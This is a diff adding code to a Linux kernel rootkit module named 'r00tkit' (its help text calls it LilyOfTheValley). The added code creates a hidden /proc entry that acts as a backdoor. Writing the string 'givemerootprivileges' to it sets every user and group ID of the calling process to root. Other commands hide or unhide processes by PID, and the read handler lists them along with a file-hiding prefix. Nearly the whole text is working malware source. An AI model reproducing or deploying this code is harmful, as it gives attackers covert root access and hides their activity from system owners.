@@ -255,3 +255,115 @@ static int r00tkit_unhide_pid(const char *buf,size_t count)
 
 	return 0;
 }
+
+
+
+static struct proc_dir_entry *r00tkit_procfs_entry,*procfs_root;
+/*
+handlers for the read and write operations from/to rootkit's
+proc filesystem entry
+*/
+static struct file_operations r00tkit_procfs_fops = 
+{
+	.write = r00tkit_procfs_write,
+	.read  = r00tkit_procfs_read
+};
+
+/*
+create a proc filysystem entry for the rootkit
+*/
+static int r00tkit_procfs_entry_init(void)
+{
+	r00tkit_procfs_entry = proc_create(R00TKIT_PROCFS_ENTRYNAME,
+					   R00TKIT_PROCFS_ENTRYPERM,
+				   	   NULL,
+					   &r00tkit_procfs_fops);
+
+	if (r00tkit_procfs_entry == NULL)
+		return 0;
+
+	procfs_root = r00tkit_procfs_entry->parent;
+
+	return 1;
+}
+
+
+static ssize_t r00tkit_procfs_write(struct file *fp,
+				    const char __user *buf,
+				    size_t count,
+				    loff_t *offp)
+{
+
+	struct cred *user_new_creds;
+
+	if (strcmp(buf,GIVEROOTPERM_CMD) == 0)
+	{
+
+		user_new_creds = prepare_creds();
+
+		if (user_new_creds != NULL)
+		{
+			user_new_creds->uid 	= (kuid_t) { 0 };
+			user_new_creds->gid 	= (kgid_t) { 0 };
+			user_new_creds->euid	= (kuid_t) { 0 };
+			user_new_creds->egid	= (kgid_t) { 0 };
+			user_new_creds->suid	= (kuid_t) { 0 };
+			user_new_creds->sgid	= (kgid_t) { 0 };
+			user_new_creds->fsuid	= (kuid_t) { 0 };
+			user_new_creds->fsgid	= (kgid_t) { 0 };
+
+			commit_creds(user_new_creds);
+
+		}
+
+	}
+
+
+	else if (strncmp(buf,HIDEPID_CMD,HIDEPID_CMD_LEN) == 0)
+	{
+		if (count == HIDEPID_CMD_LEN)
+			return -1;
+
+		if (!r00tkit_hide_pid(buf,count))
+			return -1;
+	}
+
+	else if(strncmp(buf,UNHIDEPID_CMD,UNHIDEPID_CMD_LEN) == 0)
+	{
+		if (count == UNHIDEPID_CMD_LEN)
+			return -1;
+
+		if (!r00tkit_unhide_pid(buf,count))
+			return -1;
+	}
+
+	return count;
+}
+
+
+static ssize_t r00tkit_procfs_read(struct file *fp,
+				   char __user *buf,
+				   size_t count,
+				   loff_t *offset)
+{
+	const char r00tkit_cmds[] = 
+				"###########################\n"
+				"LilyOfTheValley Commands\n"
+				"###########################\n\n"
+				"\t* [givemerootprivileges] -->> to gain root access\n"
+				"\t* [hidepidPID] -->> to hide a given pid. replace (PID) with target pid\n"
+				"\t* [unhidepidPID] -->> to unhide a given pid. replace (PID) with target pid\n"
+				"\t* [hidingfiles] -->> just prepend lilyofthevalley to the file or dir name that u want to hide\n"
+				"\x00";
+
+	if (copy_to_user(buf,r00tkit_cmds,strlen(r00tkit_cmds)))
+		return -EFAULT;
+
+	if (*offset != 0)
+		return 0;
+
+	*offset += 1;
+	return (ssize_t)strlen(r00tkit_cmds);
+}
+
+
